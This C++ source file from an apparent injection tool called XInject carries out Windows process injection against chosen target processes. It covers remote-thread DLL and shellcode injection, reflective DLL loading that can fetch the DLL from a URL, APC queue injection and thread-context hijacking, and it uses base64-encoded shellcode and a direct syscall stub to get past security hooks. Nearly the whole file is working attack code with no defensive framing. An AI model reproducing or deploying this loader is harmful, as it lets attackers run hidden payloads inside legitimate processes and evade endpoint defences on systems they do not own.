#include "include/app/Injector.hpp"

using namespace XInject::config;
using namespace XInject::net;

namespace XInject
{
    namespace Injector
    {
        bool initNtQuery()
        {
            HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
            if (hNtDll == nullptr)
            {
                Error::error(L"Wired, No ntdll");
                exit(-1); // normally will have ntdll, except inside vm
            }
            NtQuerySystemInformation =
                reinterpret_cast<fnNtQuerySystemInformation>(GetProcAddress(hNtDll, "NtQuerySystemInformation"));

            if (!NtQuerySystemInformation)
            {
                Error::error(L"Failed to get NtQuerySystemInformation address");
                return false;
            }

            NtQueryInformationThread =
                reinterpret_cast<fnNtQueryInformationThread>(GetProcAddress(hNtDll, "NtQueryInformationThread"));
            if (!NtQueryInformationThread)
            {
                Error::error(L"Failed to get NtQueryInformationThread address");
                return false;
            }

            NtQueryInformationProcess =
                reinterpret_cast<fnNtQueryInformationProcess>(GetProcAddress(hNtDll, "NtQueryInformationProcess"));
            if (!NtQueryInformationProcess)
            {
                Error::error(L"Failed to get NtQueryInformationProcess address");
                return false;
            }

            return true;
        }

        std::vector<ProcessInfo> listInjectable()
        {
            std::vector<ProcessInfo> procInfo = {};
            if (!initNtQuery() && NtQuerySystemInformation == nullptr)
            {
                Error::error(L"need initialize NtQuerySystemInformation function pointer");
                return procInfo;
            }

            ULONG bufferSize = 0;
            HANDLE hProcess = NULL;
            std::vector<BYTE> buffer;
            NTSTATUS status = NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &bufferSize);
            BOOL bWow64 = FALSE;

            buffer.resize(bufferSize);
            status = NtQuerySystemInformation(SystemProcessInformation, buffer.data(), bufferSize, &bufferSize);
            if (!NT_SUCCESS(status))
            {
                return procInfo;
            }
            PMySYSTEM_PROCESS_INFORMATION processInfo = reinterpret_cast<PMySYSTEM_PROCESS_INFORMATION>(buffer.data());
            for (;
                 processInfo;)
            {
                hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, reinterpret_cast<DWORD>(processInfo->ProcessId));
                if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE)
                {
                    if (processInfo->NextEntryOffset == 0)
                        break;
                    processInfo = reinterpret_cast<PMySYSTEM_PROCESS_INFORMATION>(
                        reinterpret_cast<PBYTE>(processInfo) + processInfo->NextEntryOffset);
                    continue;
                }
                if (IsWow64Process(hProcess, &bWow64))
                {
#ifdef _WIN64
                    if (!bWow64)
                        procInfo.push_back(
                            ProcessInfo{reinterpret_cast<DWORD>(processInfo->ProcessId), processInfo->ImageName.Buffer});

#elif _WIN32
                    if (bWow64)
                        procInfo.push_back(
                            ProcessInfo{reinterpret_cast<DWORD>(processInfo->ProcessId), processInfo->ImageName.Buffer});
#else
                    Error::error(L"Only Support i386 & amd64 arch");
#endif
                }
                CloseHandle(hProcess);
                if (processInfo->NextEntryOffset == 0)
                    break;
                processInfo = reinterpret_cast<PMySYSTEM_PROCESS_INFORMATION>(
                    reinterpret_cast<PBYTE>(processInfo) + processInfo->NextEntryOffset);
            }

            // std::reverse(procInfo.begin(), procInfo.end());
            // note: remove, due to fast refresh
            std::reverse(procInfo.begin(), procInfo.end());
            return procInfo;
        }

        bool isInjectable(DWORD pid)
        {
            HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

            if (processHandle == NULL)
                return false;
            LPVOID remoteMemory = VirtualAllocEx(processHandle, nullptr, sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            if (remoteMemory == nullptr)
            {
                CloseHandle(processHandle);
                return false;
            }
            VirtualFreeEx(processHandle, remoteMemory, 0, MEM_RELEASE);
            CloseHandle(processHandle);
            return true;
        };
        DWORD getPidByName(LPCSTR procName)
        {
            std::vector<ProcessInfo> list = listInjectable();

            int len = MultiByteToWideChar(CP_UTF8, 0, procName, -1, nullptr, 0);
            if (len == 0)
                return len;
            wchar_t *wideStrConverted = new wchar_t[len];
            MultiByteToWideChar(CP_UTF8, 0, procName, -1, wideStrConverted, len);

            for (auto l : list)
            {
                if (wcsstr(l.processName.c_str(), wideStrConverted))
                    return l.pid;
            }
            return 0;
        };
        bool isFileExists(std::string filePath)
        {
            DWORD fileAttributes = GetFileAttributesA(filePath.c_str());
            if (fileAttributes != INVALID_FILE_ATTRIBUTES &&
                !(fileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                return true;
            return false;
        };

        // remote thread injection
        // mode: 0 - dll file
        //       1 - shellcode
        //       2 - shellcode file
        bool remoteThreadInject(DWORD pid, int mode, std::string args)
        {
            bool bRet = true;
            SIZE_T dwAllocSize = args.size() + 1;
            SIZE_T dwWriteSize = 0;
            LPVOID pAddress = nullptr;
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
            if (hProcess == INVALID_HANDLE_VALUE)
            {
                Error::error(L"Invalid Process Handle");
                return false;
            }

            // 1.检查文件是否正常
            if (mode != 1)
            {
                if (!isFileExists(args)) // 文件不存在
                {
                    Error::error(L"No such file");
                    CloseHandle(hProcess);
                    return false;
                }
            }

            if (mode == 0) // 0 直接将参数写入远程进程
            {
                pAddress = VirtualAllocEx(hProcess, NULL, dwAllocSize, MEM_COMMIT, PAGE_READWRITE);
                bRet = ::WriteProcessMemory(hProcess, pAddress, args.c_str(), dwAllocSize, &dwWriteSize);
                if (!bRet)
                {
                    Error::error(L"Write Process Failed");
                    VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                    CloseHandle(hProcess);
                    return false;
                }
            }
            else if (mode == 1) // base64解密后写入远程
            {
                std::string decShellcode = Crypto::Base64Decode(args);
                if (decShellcode == "")
                {
                    CloseHandle(hProcess);
                    return false;
                }
                dwAllocSize = decShellcode.size() + 1;
                pAddress = VirtualAllocEx(hProcess, NULL, dwAllocSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                bRet = ::WriteProcessMemory(hProcess, pAddress, decShellcode.c_str(), dwAllocSize - 1, &dwWriteSize);
                if (!bRet)
                {
                    Error::error(L"Write Process Failed");
                    VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                    CloseHandle(hProcess);
                    return false;
                }
            }
            else if (mode == 2) // 2读取文件后写入进程
            {
                std::string base64Shellcode = XInject::ReadFileToString(args);
                std::string decShellcode = Crypto::Base64Decode(base64Shellcode);
                dwAllocSize = decShellcode.size();
                pAddress = VirtualAllocEx(hProcess, NULL, dwAllocSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                bRet = ::WriteProcessMemory(hProcess, pAddress, decShellcode.c_str(), dwAllocSize, &dwWriteSize);
                if (!bRet)
                {
                    Error::error(L"Write Process Failed");
                    VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                    CloseHandle(hProcess);
                    return false;
                }
            }
            else
            {
                Error::error(L"Invalid argument");
                return false;
            }
            if (pAddress == nullptr)
            {
                Error::error(L"Invalid remote process memory space");
                return false;
            }

            if (mode == 0) // inject dll file
            {
                HMODULE hmodDLL = LoadLibraryA("kernel32.dll");
                if (hmodDLL == INVALID_HANDLE_VALUE || hmodDLL == NULL)
                {
                    Error::error(L"Failed Loadlibrary kernel32");
                    VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                    CloseHandle(hProcess);
                    return false;
                }

                LPVOID LoadLibraryBase = GetProcAddress(hmodDLL, "LoadLibraryA");
                if (LoadLibraryBase == nullptr)
                {
                    Error::error(L"No Such Function in Library");
                    VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                    CloseHandle(hProcess);
                    return false;
                }

                HANDLE hRemoteProcess = NULL;
#ifdef _WIN64
                NTSTATUS status = Sw3NtCreateThreadEx(&hRemoteProcess, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)LoadLibraryBase, pAddress, FALSE, NULL, NULL, NULL, NULL);
                if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == NULL || status != STATUS_SUCCESS)
                {
                    Error::error(L"Create Remote Thread Failed!");
                    VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                    CloseHandle(hProcess);
                    FreeModule(hmodDLL);
                }
#else
#ifdef _WIN32
                hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryBase, pAddress, NULL, NULL);
                if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == NULL)
                {
                    Error::error(L"Create Remote Thread Failed!");
                    VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                    CloseHandle(hProcess);
                    FreeModule(hmodDLL);
                    return false;
                }
#endif // _WIN32
#endif // _WIN64

                WaitForSingleObject(hRemoteProcess, 500);
                VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                CloseHandle(hProcess);
                FreeModule(hmodDLL);
            }
            else if (mode == 1 || mode == 2) // 启动shellcode
            {
                HANDLE hRemoteProcess = NULL;
#ifdef _WIN64
                NTSTATUS status = Sw3NtCreateThreadEx(&hRemoteProcess, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)pAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
                if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == NULL || status != STATUS_SUCCESS)
                {
                    Error::error(L"Create Remote Thread Failed!");
                    VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                    CloseHandle(hProcess);
                }
#else
#ifdef _WIN32
                hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, nullptr, NULL, NULL);
                if (hRemoteProcess == INVALID_HANDLE_VALUE || hRemoteProcess == NULL)
                {
                    Error::error(L"Create Remote Thread Failed!");
                    VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                    CloseHandle(hProcess);
                    return false;
                }
#endif // _WIN32
#endif // _WIN64

                WaitForSingleObject(hRemoteProcess, INFINITE);
                VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                CloseHandle(hProcess);
            }

            return true;
        };

        bool unInject(DWORD pid, std::string dllName)
        {
            return true;
        };

        // reflective / manual mapping injection
        // mode: 0 - dll file
        //       1 - load from internet
        bool reflectInject(DWORD pid, int mode, std::string args)
        {
            bool bRet = true;
            SIZE_T dwAllocSize = args.size() + 1;
            SIZE_T dwWriteSize = 0;
            LPVOID pAddress = nullptr;
            LPVOID pBootAddress = nullptr;
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

            if (hProcess == INVALID_HANDLE_VALUE)
            {
                Error::error(L"Invalid Process Handle");
                return false;
            }

            if (mode == 0 && !isFileExists(args))
            {
                Error::error(L"No such file");
                CloseHandle(hProcess);
                return false;
            }
            if (mode == 0 || mode == 1)
            {
                std::string fileContent = "";
                if (mode == 0)
                    fileContent = XInject::ReadFileToString(args);
                else if (mode == 1)
                    fileContent = net::downloadFile(args);
                else
                {
                    Error::error(L"Program Control Flow Changed!!!\nFatal error!!!");
                    exit(-1);
                }
                if (fileContent == "")
                {
                    Error::error(L"Invalid Dll PE format");
                    return false;
                }

                dwAllocSize = fileContent.size() + 1;
                pAddress = VirtualAllocEx(hProcess, NULL, dwAllocSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                bRet = ::WriteProcessMemory(hProcess, pAddress, fileContent.c_str(), fileContent.length(), &dwWriteSize);
                if (!bRet)
                {
                    Error::error(L"Write Dll to Process Failed");
                    VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                    CloseHandle(hProcess);
                    return false;
                }
                pBootAddress = VirtualAllocEx(hProcess, NULL, XInject::Injector::shellcodeSize + 0x10, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                for (size_t i = 0; i < 8; i++)
                    bootshellcode[XInject::Injector::Offset + i] = *(PCHAR)((DWORD64)(&pAddress) + i);

                bRet = ::WriteProcessMemory(hProcess, pBootAddress, bootshellcode, XInject::Injector::shellcodeSize, &dwWriteSize);
                if (!bRet)
                {
                    Error::error(L"Write Shellcode to Process Failed");
                    VirtualFreeEx(hProcess, pBootAddress, dwAllocSize, MEM_COMMIT);
                    CloseHandle(hProcess);
                    return false;
                }

                LPTHREAD_START_ROUTINE lpReflectiveLoader = reinterpret_cast<LPTHREAD_START_ROUTINE>(
                    reinterpret_cast<ULONG_PTR>(pBootAddress));

                HANDLE hThread = NULL;
#ifdef _WIN64
                NTSTATUS status = Sw3NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpReflectiveLoader, pAddress, FALSE, NULL, NULL, NULL, NULL);
                if (hThread == INVALID_HANDLE_VALUE || hThread == NULL || status != STATUS_SUCCESS)
                {
                    Error::error(L"Create Thread Failed");
                    VirtualFreeEx(hProcess, pAddress, (SIZE_T)dwAllocSize, MEM_COMMIT);
                    CloseHandle(hProcess);
                    return false;
                }
#else
#ifdef _WIN32
                // Win32 dont support syscall yet
                hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, pAddress, (DWORD)NULL, NULL);
                if (hThread == INVALID_HANDLE_VALUE || hThread == NULL)
                {
                    Error::error(L"Create Thread Failed");
                    // delete[] buffer;
                    VirtualFreeEx(hProcess, pAddress, (SIZE_T)dwAllocSize, MEM_COMMIT);
                    CloseHandle(hProcess);
                    return false;
                }
#endif // _WIN32

#endif // _WIN64

                WaitForSingleObject(hThread, 500);

                VirtualFreeEx(hProcess, pAddress, (SIZE_T)dwAllocSize, MEM_COMMIT);
                CloseHandle(hProcess);
                CloseHandle(hThread);
            }
            else
            {
                Error::error(L"Invalid argument");
                return false;
            }

            return true;
        };
        namespace reflector
        {
            DWORD getOffset(HANDLE Image, CHAR *FuncName)
            {
                UINT_PTR uiBaseAddress = 0;
                UINT_PTR uiExportDir = 0;
                UINT_PTR uiNameArray = 0;
                UINT_PTR uiAddressArray = 0;
                UINT_PTR uiNameOrdinals = 0;
                DWORD dwCounter = 0;

                uiBaseAddress = (UINT_PTR)Image;
                uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;
                uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

                uiExportDir = uiBaseAddress + rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);
                uiNameArray = uiBaseAddress + rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);
                uiAddressArray = uiBaseAddress + rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);
                uiNameOrdinals = uiBaseAddress + rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress);

                dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;
                while (dwCounter--)
                {
                    char *cpExportedFunctionName = (char *)(uiBaseAddress + rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));

                    if (strstr(cpExportedFunctionName, FuncName) != NULL)
                    {
                        uiAddressArray = uiBaseAddress + rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);
                        uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));
                        return rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);
                    }
                    uiNameArray += sizeof(DWORD);
                    uiNameOrdinals += sizeof(WORD);
                }
                return 0;
            };

            DWORD rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
            {
                WORD wIndex = 0;
                PIMAGE_SECTION_HEADER pSectionHeader = NULL;
                PIMAGE_NT_HEADERS pNtHeaders = NULL;

                pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

                pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

                if (dwRva < pSectionHeader[0].PointerToRawData)
                    return dwRva;

                for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++)
                {
                    if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
                        return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
                }

                return 0;
            };
        }

        // inject thread with APC Queue
        // mode: 0 - dll file
        //       1 - shellcode
        //       2 - shellcode file
        bool apcInject(DWORD pid, int mode, std::string args)
        {
            bool bRet = true;
            SIZE_T dwAllocSize = args.size() + 1;
            SIZE_T dwWriteSize = 0;
            LPVOID pAddress = nullptr;
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
            if (hProcess == INVALID_HANDLE_VALUE)
            {
                Error::error(L"Invalid Process Handle");
                return false;
            }

            // 1.检查文件是否正常
            if (mode != 1)
            {
                if (!isFileExists(args)) // 文件不存在
                {
                    Error::error(L"No such file");
                    CloseHandle(hProcess);
                    return false;
                }
            }

            if (mode == 0) // 0 直接将参数写入远程进程
            {
                pAddress = VirtualAllocEx(hProcess, NULL, dwAllocSize, MEM_COMMIT, PAGE_READWRITE);
                bRet = ::WriteProcessMemory(hProcess, pAddress, args.c_str(), dwAllocSize, &dwWriteSize);
                if (!bRet)
                {
                    Error::error(L"Write Process Failed");
                    VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                    CloseHandle(hProcess);
                    return false;
                }
            }
            else if (mode == 1) // base64解密后写入远程
            {
                std::string decShellcode = Crypto::Base64Decode(args);
                if (decShellcode == "")
                {
                    CloseHandle(hProcess);
                    return false;
                }
                dwAllocSize = decShellcode.size() + 1;
                pAddress = VirtualAllocEx(hProcess, NULL, dwAllocSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                bRet = ::WriteProcessMemory(hProcess, pAddress, decShellcode.c_str(), dwAllocSize - 1, &dwWriteSize);
                if (!bRet)
                {
                    Error::error(L"Write Process Failed");
                    VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                    CloseHandle(hProcess);
                    return false;
                }
            }
            else if (mode == 2) // 2读取文件后写入进程
            {
                std::string base64Shellcode = XInject::ReadFileToString(args);
                std::string decShellcode = Crypto::Base64Decode(base64Shellcode);
                dwAllocSize = decShellcode.size();
                pAddress = VirtualAllocEx(hProcess, NULL, dwAllocSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                bRet = ::WriteProcessMemory(hProcess, pAddress, decShellcode.c_str(), dwAllocSize, &dwWriteSize);
                if (!bRet)
                {
                    Error::error(L"Write Process Failed");
                    VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                    CloseHandle(hProcess);
                    return false;
                }
            }
            else
            {
                Error::error(L"Invalid argument");
                return false;
            }
            if (pAddress == nullptr)
            {
                Error::error(L"Invalid remote process memory space");
                return false;
            }

            HMODULE hmodDLL = LoadLibraryA("kernel32.dll");
            if (hmodDLL == INVALID_HANDLE_VALUE || hmodDLL == NULL)
            {
                Error::error(L"Failed Loadlibrary kernel32");
                VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                CloseHandle(hProcess);
                return false;
            }

            LPVOID LoadLibraryBase = GetProcAddress(hmodDLL, "LoadLibraryA");
            if (LoadLibraryBase == nullptr)
            {
                Error::error(L"No Such Function in Library");
                VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                CloseHandle(hProcess);
                return false;
            }
            // loop process -> then loop thread
            ULONG bufferSize = 0;
            HANDLE hThread;
            std::vector<BYTE> buffer = {};
            if (NtQuerySystemInformation == nullptr)
            {
                Error::error(L"NtQuerySystemInformation is NULL");
                VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                CloseHandle(hProcess);
                return false;
            }
            NTSTATUS status = NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &bufferSize);
            bool bStat = FALSE;

            buffer.resize(bufferSize);
            status = NtQuerySystemInformation(SystemProcessInformation, buffer.data(), bufferSize, &bufferSize);
            if (!NT_SUCCESS(status))
            {
                Error::error(L"NtQuerySystemInformation failed with status");
                return false;
            }

            PMySYSTEM_PROCESS_INFORMATION processInfo = reinterpret_cast<PMySYSTEM_PROCESS_INFORMATION>(buffer.data());
            for (; processInfo;)
            {
                if (reinterpret_cast<DWORD>(processInfo->ProcessId) == pid)
                {
                    // loop thread
                    for (ULONG i = 0; i < processInfo->NumberOfThreads; i++)
                    {
                        hThread = OpenThread(
                            PROCESS_ALL_ACCESS,
                            FALSE,
                            reinterpret_cast<DWORD>(processInfo->Threads[i].ClientId.UniqueThread));
                        if (hThread == INVALID_HANDLE_VALUE || hThread == NULL)
                        {
                            continue;
                        }
                        DWORD dwRet = -1;
                        if (mode == 0)
                            dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryBase, hThread, (ULONG_PTR)pAddress);
                        else if (mode == 1 || mode == 2)
                            dwRet = QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL);
                        if (dwRet > 0)
                            bStat = TRUE;
                        CloseHandle(hThread);
                        break;
                    }
                    break;
                }
                if (processInfo->NextEntryOffset == 0)
                    break;
                processInfo = reinterpret_cast<PMySYSTEM_PROCESS_INFORMATION>(
                    reinterpret_cast<PBYTE>(processInfo) + processInfo->NextEntryOffset);
            }
            if (!bStat)
                Error::error(L"Apc Inject Failed\nAll thread can't be inject");
            VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
            CloseHandle(hProcess);

            return true;
        };

        // inject thread with APC Queue
        // mode: 0 - shellcode
        //       1 - shellcode file
        bool contextInject(DWORD pid, int mode, std::string args)
        {
            bool bRet = true;
            SIZE_T dwAllocSize = args.size() + 1;
            SIZE_T dwWriteSize = 0;
            LPVOID pAddress = nullptr;
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
            if (hProcess == INVALID_HANDLE_VALUE)
            {
                Error::error(L"Invalid Process Handle");
                return false;
            }

            if (mode == 0) // base64解密后写入远程
            {
                std::string decShellcode = Crypto::Base64Decode(args);
                if (decShellcode == "")
                {
                    CloseHandle(hProcess);
                    return false;
                }
                dwAllocSize = decShellcode.size() + 1;
                pAddress = VirtualAllocEx(hProcess, NULL, dwAllocSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                bRet = ::WriteProcessMemory(hProcess, pAddress, decShellcode.c_str(), dwAllocSize - 1, &dwWriteSize);
                if (!bRet)
                {
                    Error::error(L"Write Process Failed");
                    VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                    CloseHandle(hProcess);
                    return false;
                }
            }
            else if (mode == 1) // 2读取文件后写入进程
            {
                std::string base64Shellcode = XInject::ReadFileToString(args);
                std::string decShellcode = Crypto::Base64Decode(base64Shellcode);
                dwAllocSize = decShellcode.size();
                pAddress = VirtualAllocEx(hProcess, NULL, dwAllocSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                bRet = ::WriteProcessMemory(hProcess, pAddress, decShellcode.c_str(), dwAllocSize, &dwWriteSize);
                if (!bRet)
                {
                    Error::error(L"Write Process Failed");
                    VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                    CloseHandle(hProcess);
                    return false;
                }
            }
            else
            {
                Error::error(L"Invalid argument");
                return false;
            }

            ULONG bufferSize = 0;
            HANDLE hThread;
            std::vector<BYTE> buffer;
            if (NtQuerySystemInformation == nullptr)
            {
                Error::error(L"NtQuerySystemInformation is NULL");
                VirtualFreeEx(hProcess, pAddress, dwAllocSize, MEM_COMMIT);
                CloseHandle(hProcess);
                return false;
            }
            NTSTATUS status = NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &bufferSize);
            bool bStat = FALSE;

            buffer.resize(bufferSize);
            status = NtQuerySystemInformation(SystemProcessInformation, buffer.data(), bufferSize, &bufferSize);
            if (!NT_SUCCESS(status))
            {
                return false;
            }

            DWORD dwRet = 0;
            CONTEXT context = {0};
            context.ContextFlags = CONTEXT_CONTROL;

            PMySYSTEM_PROCESS_INFORMATION processInfo = reinterpret_cast<PMySYSTEM_PROCESS_INFORMATION>(buffer.data());
            for (; processInfo;)
            {
                if (reinterpret_cast<DWORD>(processInfo->ProcessId) == pid)
                {
                    // loop thread
                    for (ULONG i = 0; i < processInfo->NumberOfThreads; i++)
                    {
                        hThread = OpenThread(
                            PROCESS_ALL_ACCESS,
                            FALSE,
                            reinterpret_cast<DWORD>(processInfo->Threads[i].ClientId.UniqueThread));
                        if (hThread == INVALID_HANDLE_VALUE || hThread == NULL)
                        {
                            continue;
                        }

                        ///////// FUNCTIONAL CODE

                        DWORD lpflOldProtect;
                        VirtualProtectEx(hProcess, pAddress, (SIZE_T)dwAllocSize + 1, PAGE_EXECUTE, &lpflOldProtect);
                        dwRet = SuspendThread(hThread);
                        if (dwRet == (DWORD)-1)
                        {
                            Error::error(L" Suspen Thread Failed: ");

                            CloseHandle(hThread);
                            continue;
                        }

                        dwRet = GetThreadContext(hThread, &context);
                        if (!dwRet)
                        {
                            Error::error(L"Get Thread Context Failed:");

                            CloseHandle(hThread);
                            continue;
                        }

#ifdef _WIN64
                        context.Rip = (DWORD64)pAddress;
#else
                        context.Eip = (DWORD)pAddress;
#endif // _WIN64
                        dwRet = SetThreadContext(hThread, &context);
                        if (!dwRet)
                        {
                            Error::error(L"Set Thread Context Failed:");

                            CloseHandle(hThread);
                            continue;
                        }

                        ResumeThread(hThread);
                        if (dwRet == (DWORD)-1)
                        {
                            Error::error(L"Resume Thread Failed:");

                            CloseHandle(hThread);
                            continue;
                        }

                        ///////// FUNCTIONAL CODE
                        CloseHandle(hThread);
                        break;
                    }
                    break;
                }
                if (processInfo->NextEntryOffset == 0)
                    break;
                processInfo = reinterpret_cast<PMySYSTEM_PROCESS_INFORMATION>(
                    reinterpret_cast<PBYTE>(processInfo) + processInfo->NextEntryOffset);
            }
            return true;
        }

    }

} // namespace XInject